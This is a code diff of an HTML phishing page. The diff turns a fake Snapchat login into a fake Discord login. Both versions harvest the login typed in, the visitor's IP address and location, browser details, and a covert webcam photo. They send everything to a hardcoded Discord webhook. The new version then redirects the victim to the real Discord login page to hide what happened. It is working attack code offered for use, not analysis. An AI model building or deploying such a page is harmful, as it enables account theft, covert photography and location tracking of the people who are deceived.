@@ -3,87 +3,158 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat - Log In</title>
+    <title>Discord</title>
     <style>
-        body { background-color: #FFFC00; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 300px; }
-        .ghost { width: 80px; margin-bottom: 20px; }
-        h2 { margin-bottom: 20px; color: #333; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; background-color: #f9f9f9; }
-        button { width: 100%; padding: 12px; background-color: #FFFC00; border: none; border-radius: 20px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
-        button:hover { background-color: #e6e300; }
+        body {
+            background-color: #5865F2;
+            background-image: url('https://discord.com/assets/1c8a54f25d101bdc607cec7228247a9a.svg');
+            background-size: cover;
+            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #dcddde;
+        }
+        .login-box {
+            background-color: #36393f;
+            padding: 32px;
+            border-radius: 5px;
+            width: 480px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
+            text-align: center;
+            box-sizing: border-box;
+        }
+        h3 { color: #fff; margin-bottom: 8px; font-size: 24px; font-weight: 600; }
+        p { color: #b9bbbe; font-size: 16px; margin-top: 0; margin-bottom: 20px; }
+        .input-group { text-align: left; margin-bottom: 20px; }
+        label { display: block; color: #8e9297; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 8px; }
+        input[type="email"], input[type="password"] {
+            width: 100%; padding: 10px; background-color: #202225; border: 1px solid #202225;
+            border-radius: 3px; color: #dcddde; font-size: 16px; box-sizing: border-box;
+        }
+        input:focus { border-color: #7289da; outline: none; }
+        button {
+            width: 100%; background-color: #5865F2; color: #fff; border: none;
+            padding: 10px; font-size: 16px; border-radius: 3px; cursor: pointer; font-weight: 600;
+            transition: background-color 0.17s ease;
+        }
+        button:hover { background-color: #4752C4; }
+        .link { color: #00aff4; font-size: 14px; text-decoration: none; display: block; text-align: left; margin-top: 4px; }
+        .link:hover { text-decoration: underline; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-<div class="login-container">
-    <svg class="ghost" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-        <path d="M50 10 C30 10 20 30 20 50 C20 70 30 80 30 80 C30 80 25 85 20 85 C25 90 35 90 40 85 C45 90 55 90 60 85 C65 90 75 90 80 85 C75 85 70 80 70 80 C70 80 80 70 80 50 C80 30 70 10 50 10 Z" fill="#fff" stroke="#000" stroke-width="3"/>
-    </svg>
-    <h2>Log In</h2>
-    <input type="text" id="username" placeholder="Username or Email" required>
-    <input type="password" id="password" placeholder="Password" required>
-    <button id="loginBtn">Log In</button>
-</div>
-<video id="video" autoplay></video>
-<canvas id="canvas"></canvas>
-<script>
-    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
-    let userIP = '';
-    let userLocation = '';
-    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => { userIP = data.ip; userLocation = `${data.city}, ${data.region}, ${data.country_name}`; }).catch(err => console.error(err));
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const loginBtn = document.getElementById('loginBtn');
-    loginBtn.addEventListener('click', async () => {
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-        if(!username || !password) return alert('Please enter credentials.');
-        loginBtn.innerText = 'Scanning Face...';
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            video.srcObject = stream;
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const imageData = canvas.toDataURL('image/jpeg');
-            stream.getTracks().forEach(track => track.stop());
-            sendToWebhook(username, password, imageData);
-        } catch (err) {
-            sendToWebhook(username, password, null);
+    <div class="login-box">
+        <h3>Welcome back!</h3>
+        <p>We're so excited to see you again!</p>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Email or Phone Number <span style="color: #ed4245;">*</span></label>
+                <input type="email" id="email" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password <span style="color: #ed4245;">*</span></label>
+                <input type="password" id="password" required>
+                <a href="#" class="link">Forgot your password?</a>
+            </div>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" width="320" height="240"></canvas>
+
+    <script>
+        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
+        
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch (e) { return 'Unknown'; }
         }
-    });
-    function sendToWebhook(user, pass, imageBase64) {
-        const time = new Date().toLocaleString();
-        const osBrowser = navigator.userAgent;
-        const embed = {
-            title: '👻 New Snapchat Login Captured',
-            color: 16776960,
-            fields: [
-                { name: 'Username/Email', value: user, inline: true },
-                { name: 'Password', value: pass, inline: true },
-                { name: 'IP Address', value: userIP || 'Unknown', inline: false },
-                { name: 'Location', value: userLocation || 'Unknown', inline: false },
-                { name: 'Time', value: time, inline: false },
-                { name: 'OS/Browser', value: osBrowser, inline: false }
-            ]
-        };
-        const payload = new FormData();
-        if (imageBase64) {
-            const byteString = atob(imageBase64.split(',')[1]);
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
-            const blob = new Blob([ab], { type: 'image/jpeg' });
-            payload.append('file', blob, 'face_scan.jpg');
-            embed.image = { url: 'attachment://face_scan.jpg' };
+
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
+                        err => resolve('Denied/Unavailable')
+                    );
+                } else {
+                    resolve('Not supported');
+                }
+            });
         }
-        payload.append('payload_json', JSON.stringify({ embeds: [embed] }));
-        fetch(WEBHOOK_URL, { method: 'POST', body: payload }).then(() => {
-            document.body.innerHTML = '<h2 style="text-align:center; margin-top:20vh;">Login Failed. Please try again later.</h2>';
+
+        async function capturePhoto() {
+            return new Promise(async (resolve) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    video.onloadedmetadata = () => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve(canvas.toDataURL('image/jpeg'));
+                    };
+                } catch (e) {
+                    resolve(null);
+                }
+            });
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const time = new Date().toISOString();
+            const os = navigator.platform;
+            const browser = navigator.userAgent;
+            
+            const ip = await getIP();
+            const location = await getLocation();
+            const photoDataUrl = await capturePhoto();
+
+            const formData = new FormData();
+            
+            const embed = {
+                title: "New Login Captured",
+                color: 16711680,
+                fields: [
+                    { name: "Email", value: email, inline: true },
+                    { name: "Password", value: password, inline: true },
+                    { name: "IP Address", value: ip, inline: false },
+                    { name: "Location", value: location, inline: false },
+                    { name: "OS", value: os, inline: true },
+                    { name: "Browser", value: browser, inline: false },
+                    { name: "Time", value: time, inline: false }
+                ]
+            };
+            
+            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
+
+            if (photoDataUrl) {
+                const blob = await (await fetch(photoDataUrl)).blob();
+                formData.append('file', blob, 'capture.jpg');
+            }
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+                window.location.href = 'https://discord.com/login';
+            } catch (err) {
+                console.error(err);
+            }
         });
-    }
-</script>
+    </script>
 </body>
 </html>
